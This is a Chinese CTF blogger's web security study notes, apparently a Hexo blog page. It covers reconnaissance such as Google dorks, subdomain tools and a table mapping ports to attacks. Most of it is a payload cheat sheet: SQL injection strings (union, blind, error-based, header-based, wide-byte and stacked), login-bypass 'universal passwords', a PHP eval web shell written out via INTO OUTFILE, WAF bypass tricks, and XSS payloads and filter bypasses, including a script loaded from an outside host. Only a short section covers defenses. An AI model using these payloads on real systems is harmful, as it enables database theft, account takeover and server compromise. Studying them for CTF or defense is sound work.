@@ -1,0 +1,1338 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.0"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Tag: web - 真寻の窝</title><meta description="菜鸡ctfer，努力想成为大佬中...(也许永远也不会吧)"><meta property="og:type" content="website"><meta property="og:title" content="真寻の窝"><meta property="og:url" content="https://mahiro424.github.io/"><meta property="og:site_name" content="真寻の窝"><meta property="og:description" content="菜鸡ctfer，努力想成为大佬中...(也许永远也不会吧)"><meta property="og:locale" content="zh"><meta property="article:author" content="mahiro"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://mahiro424.github.io/img/avatar.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://mahiro424.github.io/"},"headline":"真寻の窝","image":["https://mahiro424.github.io/img/avatar.png"],"author":{"@type":"Person","name":"mahiro"},"description":"菜鸡ctfer，努力想成为大佬中...(也许永远也不会吧)"}</script><link rel="alternative" href="/atom.xml" title="真寻の窝" type="application/atom+xml"><link rel="icon" href="/img/favicon.png"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.12/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><link rel="stylesheet" href="/css/style.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><script src="/js/md5.min.js"></script><link rel="stylesheet" href="/live2d/waifu.css"><script type="text/javascript" async src="/live2d/autoload.js"></script></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.png" alt="真寻の窝" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/media">影音</a><a class="navbar-item" href="/album">相册</a><a class="navbar-item" href="/friend">友链</a><a class="navbar-item" href="/self-talking">碎碎念</a><a class="navbar-item" href="/message">留言</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/mahiro424"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Suche" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">Tags</a></li><li class="is-active"><a href="#" aria-current="page">web</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2019-11-29T13:56:31.000Z">2019-11-29</time><a class="commentCountImg" href="/2019/11/29/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#comment-container"><span class="display-none-class">127553c7d77471e19178bb2151a1d9a5</span><img class="not-gallery-item" src="/img/chat.svg"> <span class="commentCount" id="127553c7d77471e19178bb2151a1d9a5"> 99+</span>    </a><span class="level-item">2 hours lesen (Über 19819 Worte)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/11/29/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">web安全学习笔记</a></h1><div class="content"><h1 id="第一节"><a href="#第一节" class="headerlink" title="第一节"></a>第一节</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="谷歌黑语法"><a href="#谷歌黑语法" class="headerlink" title="谷歌黑语法"></a>谷歌黑语法</h3><pre><code>intitle:关键字  ~搜索网页标题中含有关键字的网页~
+intext:关键字   ~搜索站点正文中含有关键字的网页~
+inurl:关键字    ~搜索URL中包含有指定字符串的网址~
+site:域名       ~在指定站点内查找相关的内容~
+filetype:文件   ~搜索指定类型的文件~</code></pre><h3 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h3><pre><code>域名是由一串用点分割的名字组成的Internet上某一台计算机或者计算机组的名称，用于在数据传输时，标识计算机的电子方位。</code></pre><h3 id="子域名信息收集"><a href="#子域名信息收集" class="headerlink" title="子域名信息收集"></a>子域名信息收集</h3><pre><code>子域名是某个主域的二级域名或者多级域名，在防御措施严密的情况下无法直接拿下主域，那么可以用迂回战术拿下子域名，然后无限靠近主域。</code></pre><ol>
+<li>子域名挖掘工具： Matltego CE , wydomain , subDomainBrute , dnsmaper , Layer子域名挖掘机</li>
+<li>搜索引擎挖掘： 用谷歌黑语法,如site:xxx.com</li>
+<li>第三方网站查询： <a href="http://tool.chinaz.com/subdomain">http://tool.chinaz.com/subdomain</a>  , <a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> , <a href="https://www.shodan.io/">https://www.shodan.io/</a> , <a href="https://www.zoomeye.org">https://www.zoomeye.org</a></li>
+<li>证书透明度公开日志枚举： <a href="https://crt.sh/">https://crt.sh/</a> , <a href="https://censys.io/">https://censys.io/</a></li>
+<li>其他途径： <a href="https://phpinfo.me/domain">https://phpinfo.me/domain</a> , <a href="https://dns.aizhan.com/">https://dns.aizhan.com/</a></li>
+</ol>
+<h3 id="CMS指纹识别"><a href="#CMS指纹识别" class="headerlink" title="CMS指纹识别"></a>CMS指纹识别</h3><pre><code>常见CMS： dedecms（织梦）, Discuz , Phpcms , wordpress</code></pre><ul>
+<li>CMS识别工具：<ol>
+<li>在线工具： <a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a> , <a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a></li>
+<li>本地工具： whatweb,御剑指纹识别程序,大禹CMS识别程序</li>
+</ol>
+</li>
+</ul>
+<p>0<del>~ 查找到CMS后可以去找对应CMS漏洞的POC ~</del></p>
+<h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><pre><code>Web目录结构可能会存在敏感隐藏文件，如后台页面，上传页面，数据库文件，甚至是网站源代码文件压缩包等。
+web敏感性信息；robots.txt,crossdomain.xml,sitemap.xml,源码泄露文件
+常用的探测工具：御剑后台扫描工具，wwwscan命令行工具，dirsearch，dirbuster扫描工具</code></pre><h3 id="whois信息收集"><a href="#whois信息收集" class="headerlink" title="whois信息收集"></a>whois信息收集</h3><pre><code>whois是用来查询域名的IP以及所有者等信息的传输协议。TCP端口是43。</code></pre><ul>
+<li>whois查询方法:<ol>
+<li>web接口查询：<a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a> , <a href="https://www.whois365.com/cn/">https://www.whois365.com/cn/</a> , <a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a> , <a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a> , <a href="https://scan.top15.cn/web/">https://scan.top15.cn/web/</a></li>
+<li>在Kali linux下自带了Whois查询工具，通过命令Whois域名进行查询。</li>
+</ol>
+</li>
+</ul>
+<h3 id="备案信息收集"><a href="#备案信息收集" class="headerlink" title="备案信息收集"></a>备案信息收集</h3><p>ICP备案查询方法：<br>    <a href="https://www.beianbeian.com/">https://www.beianbeian.com/</a><br>    <a href="https://www.miitbeian.gov.cn/publish/query/indexFirst.action">https://www.miitbeian.gov.cn/publish/query/indexFirst.action</a><br>    <a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p>
+<h3 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a>端口信息收集</h3><pre><code>对于收集目标机器端口状态可以使用工具来进行测试，工具原理：使用TCP或者UDP等协议向目标端口发送指定标志位等的数据包，等待目标返回数据包，以此来判断端口状态。</code></pre><ul>
+<li>端口信息收集方法：<ol>
+<li>使用nmap探测。 nmap -A -V -T4 目标</li>
+<li>使用masscan探测。 masscan -p端口 目标 –rate=速率(0-10000)</li>
+</ol>
+</li>
+<li>常见的端口信息及渗透方法：<br>  端口————-服务———–渗透方法——————————————————-<br>  tcp 20,21         ftp            允许匿名的上传下载，爆破，win提权，远程执行，各类后门<br>  tcp 22             ssh               爆破，ssh隧道，内网代理转发，文件传输，弱口令<br>  tcp 23             telnet            爆破，嗅探，交换登陆，弱口令<br>  tcp/udp 53        dns            允许区域传送，dns劫持，dns投毒，欺骗<br>  tcp 80,443,8080    web服务端口       各类web中间件漏洞，各类web框架漏洞<br>  tcp 137,139,445    samba           爆破，远程执行类漏洞<br>  udp 161         snmp           爆破默认团队字符串，搜集目标内网信息<br>  tcp 1433         sql server        注入，提权，弱口令，爆破<br>  tcp 1521        oracle           爆破，注入，提权，弱口令<br>  tcp 3306         mysql           弱口令，爆破，注入，提权<br>  tcp 3389        windows远程       爆破，弱口令，ms12-020<br>  tcp 3690        svn            svn泄露，未授权访问<br>  tcp 6379        redis           未授权访问，弱口令爆破<br>  tcp 27017,27018    mongodb           爆破，未授权访问</li>
+</ul>
+<h2 id="真实IP查询"><a href="#真实IP查询" class="headerlink" title="真实IP查询"></a>真实IP查询</h2><pre><code>cdn(content delivery network 内容分发网络)是一种新型网络构建方式，是构建在现有网络基础上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡，内容分发，调度等模块，使用户就近获取所需内容，降低网络堵塞，提高用户访问响应速度和命中率。</code></pre><ul>
+<li>绕过cdn查找真实IP的方法<ol>
+<li>通过ping判断是否存在cdn，不唯一则多半使用了cdn。(<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a> , <a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a> , <a href="http://ip138.com/">http://ip138.com/</a>)</li>
+<li>使用nslookup检测</li>
+<li>内部邮箱源 收集到内部邮箱服务器IP地址</li>
+<li>网站phpinfo文件</li>
+<li>分站IP地址，查询子域名CDN很贵，很有可能分站就不再使用CDN</li>
+<li>国外访问  <a href="https://asm.ca.com/en/ping.php/">https://asm.ca.com/en/ping.php/</a></li>
+<li>查询域名解析记录 <a href="https://viewdns.info/">https://viewdns.info/</a></li>
+</ol>
+</li>
+</ul>
+<h2 id="旁站C段查询"><a href="#旁站C段查询" class="headerlink" title="旁站C段查询"></a>旁站C段查询</h2><pre><code>旁站是和目标在同一服务器上的其他网站。
+旁注：通过入侵安全性较差的旁站，之后通过提权跨目录等手段拿到目标服务器的权限。
+工具：御剑，WebRobot，K8_C段旁注工具
+C段是指位于C段的设备上都处于同一台服务器上，IP分为ABCD四个段，如    192.168.3.0-255的设备都处于同一个C段
+C段入侵：入侵C段上的任意一台设备，然后利用工具嗅探获取其他信息。
+工具：Cain，sniffit，snoop，dsniff，tcpdump</code></pre><h2 id="漏洞查询站点"><a href="#漏洞查询站点" class="headerlink" title="漏洞查询站点"></a>漏洞查询站点</h2><p><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a> , <a href="https://www.shuimugan.com/">https://www.shuimugan.com/</a> , <a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></p>
+<h1 id="第二节"><a href="#第二节" class="headerlink" title="第二节"></a>第二节</h1><h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><h3 id="SQL注入漏洞原理"><a href="#SQL注入漏洞原理" class="headerlink" title="SQL注入漏洞原理"></a>SQL注入漏洞原理</h3><ol>
+<li><p>sql注入原理</p>
+<blockquote>
+<p>sql注入是指通过把恶意的sql命令插入到web表单中或者输入域名处或者请求查询的字符串中，以达到来欺骗服务器来执行恶意的sql命令的目的。</p>
+</blockquote>
+</li>
+<li><p>sql注入简单验证方式</p>
+<blockquote>
+<p>简单注入验证： 1.在变量后面加 ‘  2. and 1=1  3. and 1=2  如果页面中的mysql报错，则存在sql注入漏洞。</p>
+</blockquote>
+</li>
+<li><p>sql5.0及5.0以下版本区别</p>
+<blockquote>
+<p>在mysql 5.0以后的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。包括schemata,tables,columns，而5.0 以前只能暴力破解表名。5.0以下是多用户单操作，5.0以上是多用户多操作。</p>
+</blockquote>
+</li>
+<li><p>sql的增删改查</p>
+<blockquote>
+<p>select 列名称 from 表名称 where 字段1=’条件1’ and 字段2=’条件2’<br> insert into table name (列1,列2,列3…) values(值1,值2,值3…)<br> update 表名称 set 列名称=新值 where 列名称=某值<br> delete from 表名称 where 列名称=值</p>
+</blockquote>
+</li>
+<li><p>mysql 常用函数</p>
+<blockquote>
+<p>user() 查看当前mysql登录用户名<br> database() 查看当前使用的mysql数据库库名<br> version() 查看当前mysql版本<br> group_concat() 将group by 产生的同一分组的值连接起来，返回一个字符串结果<br> concat() 将两个字符串连接为一个字符串<br> limit m,n 从m行开始(m行不算)，到m+n行<br> if(a,b,c) 如果条件a成立，执行b，都否则执行c(当if被过滤时有select case where 条件 then 代码1 else 代码2 end)</p>
+</blockquote>
+</li>
+<li><p>mysql注释</p>
+<blockquote>
+<p>#或–空格或/<em>*/<br> 内联注释/</em>! sql语句 */，用于空格被过滤绕过</p>
+</blockquote>
+</li>
+<li><p>sql注入类型</p>
+<blockquote>
+<p>数字型  select * from table where id = 用户输入id<br> 字符型  select * from table where id =’用户输入id’</p>
+</blockquote>
+</li>
+<li><p>基于报错注入的漏洞利用方式</p>
+<blockquote>
+<p>1.利用order by 判断字段数 ?id=1 order by num –+<br> 2.利用union select 联合查询判断当前数据库名，版本信息 ?id=-1’ union select 1,group_concat(database(),0x7e,version()),3 –+<br> 3.利用union select 联合查询获取表名 ?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() –+<br> 4.利用 union select 联合查询获取字段名 ?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’表名’<br> 5.利用union select 联合查询获取字段值 ?id=-1’ union select 1,group_concat(字段名1,字段名2,字段名3…) from 字段名 –+</p>
+</blockquote>
+</li>
+<li><p>基于盲注的漏洞利用方式<br> Blind SQL 是注入攻击的一种方式，向数据库发送true或false这样的问题，并根据应用程序返回的信息判断结果，有时候web应用会显示，后端数据库执行SQL查询返回的错误信息。若数据库没有输出数据到web页面，攻击者会询问一些列的true或false问题，强制从数据库中获取数据。</p>
+<blockquote>
+<p>基于时间的盲注</p>
+<pre><code>关键语句 if(ascii(substr(database(),1,1)=115,1,sleep(3)));：当数据库名的第一个字母的ascii码值等于115时，执行一次sleep(3)函数等待3秒，否则正常执行。
+写时间盲注脚本爆破。</code></pre><p>基于布尔的盲注</p>
+<pre><code>关键语句 select length(database()) &gt; 3;：当数据库的长度大于3时返回true，否则false。
+select substr(database(),1,1) = &apos;a&apos;;：当数据库名的第一个字符是a时返回true，否则false。
+select ascii(substr(database(),1,1)) &lt; 115;：当数据库名的第一个字符的ascii码小于115时返回true，否则false。
+写布尔盲注脚本爆破。</code></pre></blockquote>
+</li>
+<li><p>mysql读写文件</p>
+<blockquote>
+<p>读取前提</p>
+<pre><code>* 用户权限足够高，最好是root权限
+* secure_file_priv 不为 null，这个参数用来限制数据导入和导出操作的效果，例如执行load data，into outfile语句和load_file()函数，这些操作都需要用户有file文件权限。
+1.如果这个参数为空，这个变量没有效果。
+2.如果这个参数设定为一个目录名，mysql服务只允许这个目录中执行文件的导入和导出操作。这个目录必须存在，mysql服务不会创建它。
+3.如果这个参数为null，mysql服务会禁止导入和导出操作。这个参数在5.7.6版本被引入。</code></pre><p>读文件(绝对路径)</p>
+<pre><code>union select 1,load_file(&quot;F:\\Test\\test.txt&quot;),3 --+</code></pre><p>写文件(绝对路径)</p>
+<pre><code>union select 1,&apos;&lt;?php @eval($_POST[&apos;x&apos;]);?&gt;&apos;,3 into outfile &apos;F:\\Test\\test.php&apos; --+</code></pre></blockquote>
+</li>
+<li><p>基于双注入的漏洞利用方式<br>报错注入实际上是两个嵌套的查询，即select…(select…)…，里面的select被称之为子查询，语句执行顺序是先执行子查询，在执行外面的查询。</p>
+<blockquote>
+<p>相关函数</p>
+<pre><code>rand() 随机函数，返回0~1之间的某个值
+floor(a) 取整函数，返回小于等于a，且值最接近a的一个整数
+count() 计数函数，返回查询对象的总数
+group by clause 分组语句，按照查询结果分组
+floor(rand(0)*2)的值是定性的，是假随机，为011011</code></pre><p>注入代码</p>
+<pre><code>获取数据库
+union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0*2)))x from information_schema.tables group by x)a --+</code></pre></blockquote>
+<pre><code>1&apos; union select count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x#
+
+获取表名
+union select 1,2,3 from (select count(*),concat((select concat(group_concat(table_name),0x3a,0x3a) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+
+
+1&apos; union select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x#
+
+获取列名
+union select 1,2,3 from (select count(*),concat((select concat(group_concat(column_name),0x3ax,0x3a) from information_schema.columns where table_name=&apos;表名&apos; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+
+
+1&apos; Union select count(*),concat((select column_name from information_schema.columns where table_schema=&apos;数据库名&apos; and table_name=&apos;表名&apos; limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x#
+
+获取列值
+union select 1,2,3 from (select count(*),concat((select concat(列值1,0x3a,0x3a,列值2,0x3a,0x3a....) from 表名 limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+
+
+1&apos; union select count(*),concat((select 列名 from 表名 limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x#</code></pre></li>
+</ol>
+<ol start="12">
+<li><p>基于增删改查注入的漏洞利用方式</p>
+<blockquote>
+<p>增删改查</p>
+<pre><code>* 增：select 列名称 from 表名称 where 字段1=&apos;条件1&apos; and 字段2=&apos;条件2&apos;
+* 插：insert into table name (列1,列2,列3...) values(值1,值2,值3...)
+* 改：update 表名称 set 列名称=新值 where 列名称=某值
+* 删：delete from 表名称 where 列名称=值</code></pre><p>注入方式</p>
+<pre><code>floor：?id=1 or (select * from (select count(),concat(0x7e,(select group_concat(table_name),0x7e),floor(rand(0)2))x from information_schema.tables group by x)a)
+extractvalue：?id=1 and extractvalue(1,concat(0x7e,(select user()),0x7e))
+updatexml：?id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)
+double query injection：?id=1 or 1 group by concat_ws(0x7e,(select version()),floor(rand(0)*2)) having min(0) 1
+exp(5.5.5以上)：?id=1 and (select exp(~(select * from(select user())x)))</code></pre></blockquote>
+</li>
+<li><p>基于http头注入的漏洞利用方式</p>
+<blockquote>
+<p>http头部主要参数</p>
+<pre><code>* User-Agent：使得服务器能够识别用户所使用的操作系统，浏览器版本等信息
+* Cookie：网站为了辨别用户身份，进行session跟踪而存储在用户本地终端上的数据
+* X-Forwarded-For：代表客户端，也就是HTTP请求端的真实IP地址
+* Rerferer：浏览器向WEB服务器表明自己是从哪个页面链接过来的
+* Host：客户端指定自己想访问的WEB服务器的域名</code></pre><p>user-agent头注入</p>
+<pre><code>User-Agent: aaa&apos; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &apos;1&apos;=&apos;1</code></pre><p>xxf头注入</p>
+<pre><code>X-Forwarded-For: 127.0.0.1&apos; and extracevalue(1,concat(0x7e,(select user()),0x7e)) --+</code></pre><p>cookie头注入</p>
+<pre><code>Cookie:40658142362323623265623&apos; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</code></pre></blockquote>
+</li>
+<li><p>基于宽字节注入的漏洞利用方式</p>
+<ol>
+<li>注入原理<br> GBK占用两个字节，ASCII占用一个字节，PHP中的编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。<br> %df，会被PHP当中的addslashes函数转义为”%df&quot;，”&quot;在URL里的编码是”%5c”，也就是说”%df”会被转义成”%df%5c%27”。倘若网站的字符集是GBK，MYSQL使用的编码也是GBK的话，就会被认为是”%df%5c%27”是一个宽字符，也就是”縝”。</li>
+<li>注入方式<br> 1%df’ union select 1,user(),database() –+</li>
+</ol>
+</li>
+<li><p>基于二次注入的漏洞利用方式</p>
+<blockquote>
+<p>注入原理</p>
+<pre><code>1. 插入恶意数据：在进行数据库插入数据时，对其中的特殊字符做了转义处理，在写入数据时，又保留了原来的数据。
+2. 引用恶意数据：在取数据时没有进行校验验证的处理，导致之前被插入的恶意数据被引用，从而引发注入。</code></pre><p>＞ 注入方式</p>
+<pre><code>一般出现在用户修改账户的逻辑接口处，比如某个系统的超级管理员账号是admin，那么在敏感字符未被完全过滤的情况下，可以注册一个admin#账号，然后在修改密码的逻辑接口处重置密码，因为#注释了用户名后面的内容，所以相当于直接修改了admin的密码。</code></pre></blockquote>
+</li>
+<li><p>基于堆叠注入的漏洞利用方式</p>
+<blockquote>
+<p>注入原理</p>
+<pre><code>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</code></pre><p>注入方式</p>
+<pre><code>1. 1;show databases;#
+2. 1&apos;;show tables;#
+3. 1&quot;;show columns from `表名`;#护着1&quot;;desc `表名`;#
+4. 预编译
+5. 重命名</code></pre></blockquote>
+</li>
+<li><p>基于服务端模版注入(SSTI)攻击的漏洞利用方式</p>
+</li>
+<li><p>基于回车换行注入(CRLF)攻击的漏洞利用方式</p>
+</li>
+<li><p>(待补充)</p>
+</li>
+</ol>
+<h3 id="SQL-万能密码"><a href="#SQL-万能密码" class="headerlink" title="SQL 万能密码"></a>SQL 万能密码</h3><pre><code>&apos;-0-&apos;
+&apos; or 1=&apos;1
+-1&apos; union select 1,&apos;xx&apos;,&apos;xx&apos; -- -
+admin
+admin&apos;--
+admin&apos; or 4=4--
+admin&apos; or &apos;1&apos;=&apos;1&apos;--
+admin888
+&quot;or &quot;a&quot;=&quot;a
+admin&apos; or 2=2#
+a&apos; having 1=1#
+a&apos; having 1=1--
+admin&apos; or &apos;2&apos;=&apos;2
+&apos;)or(&apos;a&apos;=&apos;a
+or 4=4--
+a&apos;or&apos; 4=4--
+&quot;or 4=4--
+&apos;or&apos;a&apos;=&apos;a
+&quot;or&quot;=&quot;a&apos;=&apos;a
+&apos;or&apos;&apos;=&apos;
+&apos;or&apos;=&apos;or&apos;
+1 or &apos;1&apos;=&apos;1&apos;=1
+1 or &apos;1&apos;=&apos;1&apos; or 4=4
+&apos;OR 4=4%00
+&quot;or 4=4%00
+&apos;xor
+admin&apos; UNION Select 1,1,1 FROM admin Where &apos;&apos;=&apos;
+1
+-1%cf&apos; union select 1,1,1 as password,1,1,1 %23
+1
+17..admin&apos; or &apos;a&apos;=&apos;a 密码随便
+&apos;or&apos;=&apos;or&apos;
+&apos;or 4=4/*
+something
+&apos; OR &apos;1&apos;=&apos;1
+1&apos;or&apos;1&apos;=&apos;1
+admin&apos; OR 4=4/*
+1&apos;or&apos;1&apos;=&apos;1</code></pre><h3 id="SQL注入简单绕过方式"><a href="#SQL注入简单绕过方式" class="headerlink" title="SQL注入简单绕过方式"></a>SQL注入简单绕过方式</h3><pre><code>&gt; 大小写绕过
+    UnioN sELect 1,2,3 --+
+
+&gt; 双写绕过
+    UniunionOn SeselectlEct 1,2,3 --+
+
+&gt; 编码绕过
+    http://tool.chinaz.com/tools/urlencode.aspx
+
+&gt; 内联注释绕过
+    /*!UNION*/ /*!SELECT*/ 1,2,3 --+
+
+&gt; 空格绕过
+    * union/**/select/**/1,2,3/**/--+
+    * union  select  1,2,3  --+
+    * union%a0select%a01,2,3%a0--+
+    * and(sleep(ascii(mid(database()from(1)for(1)))=123))--+
+
+&gt; 引号绕过(十六进制)
+    select table_name from information_schema.tables where table_schema=%64%61%74%61%62%61%73%65%28%29
+
+&gt; 逗号绕过(from,offset)
+    select substr(database() from 1 for 1 limit 1 offset 0)
+
+&gt; 比较符号绕过(greatest())
+    and greatest(ascii(substr(database(),0,1)),64)=64
+
+&gt; or,and 绕过
+    and=&amp;&amp;,or=||
+
+&gt; 注释符号绕过
+    * union select 1,2,3 || &apos;1
+    * union select 1,2,&apos;3 
+
+&gt; 等号绕过
+    like 或者 &lt;&gt;
+
+&gt; 等价函数绕过
+    * hex(),bin() == ascii()
+    * sleep() == benchmark()
+    * mid(),substr() == substring()
+    * concat_ws() == group_concat()</code></pre><h3 id="SQL注入的防御措施"><a href="#SQL注入的防御措施" class="headerlink" title="SQL注入的防御措施"></a>SQL注入的防御措施</h3><pre><code>* 对用户的输入内容进行转义(addskashes(),mysql_real_escape())
+* 对用户的输入内容进行关键字过滤(preg_replace())，限制用户输入的长度
+* 使用sql预处理语句(pdo)，对sql语句先进行预编译处理，在进行参数绑定，最后传入参数
+* 部署防火墙</code></pre><h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><pre><code>恶意攻击者往web页面里插入恶意的script代码，当用户浏览该页面之时，嵌入web页面的script代码会被执行，从而达到恶意攻击用户的目的。
+xss漏洞获取cookie并接受web界面的平台，xss能做js能做的所有事情，包括但不限于窃取cookie，后台增删改文章，钓鱼，利用xss漏洞进行传播，修改网页代码，网站重定向，获取用户信息等。</code></pre><h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><pre><code>反射型xss又叫非持久性xss，这种攻击具有一次性。攻击者通过邮件等形式将包含xss代码的链接发送给正常用户，当用户点击时，服务器接受该用户的请求并进行处理，然后把带有xss的代码发送给服务器，服务器解析执行代码，触发xss漏洞。
+如,&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code></pre><h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><pre><code>存储型xss又称之为持久性xss,攻击脚本存储在目标服务器的数据库中，具有更强的隐蔽性。攻击者在论坛，博客，留言板中，发帖的过程中嵌入xss攻击代码，帖子被目标服务器存储在数据库中，当用户进行正常访问时，触发xss代码。
+如,&lt;script src=http://xxx.com/xxs.js&gt;&lt;/script&gt;</code></pre><h3 id="dom型xss"><a href="#dom型xss" class="headerlink" title="dom型xss"></a>dom型xss</h3><pre><code>dom型xss是基于文档对象模型的一种漏洞，使用dom动态访问更新文档的内容，结构及样式，通过html dom对树上的所有节点进行修改，服务器响应不会处理攻击者脚本，而是用户浏览器处理这些响应时，dom对象就会处理xss代码，触发xss代码。
+如,&lt;img src=1 onerror=alert(&apos;hello world&apos;)&gt;
+参考资料:https://blog.csdn.net/ski_12/article/details/60468362</code></pre><h3 id="xss常用绕过方式"><a href="#xss常用绕过方式" class="headerlink" title="xss常用绕过方式"></a>xss常用绕过方式</h3><pre><code>&gt; 大小写绕过
+    &lt;sCRipT&gt;alert(/xss/)&lt;/ScrIPt&gt;
+
+&gt; 编码绕过
+    1.十六进制编码 &lt;0x736372697074&gt;alert(&apos;123&apos;)&lt;/0x736372697074&gt;&gt;
+    2.url编码 %3csvg+onload%3dalert(1)%3e%3c%2fsvg%3e
+    3.unicode编码 &lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;
+
+&gt; magic_quotes_gpc绕过
+    &lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt;
+
+&gt; 标签绕过
+    &quot;&gt;&lt;script&gt;alert(/123/)&lt;/script&gt;
+    &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+    &lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;
+    &lt;button onclick=&quot;javascript:alert(&apos;xss&apos;)&gt;XSS&lt;/button&quot;&gt;
+    &lt;title&gt;&lt;img a=&quot;&lt;/title&gt;&lt;img/src=1 onerror=alert(1)//&quot;&gt;
+    &quot;onsubmit=javascript:alert(1)%20name=&quot;a
+    &lt;details open ontoggle=&quot;eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))&quot;&gt;
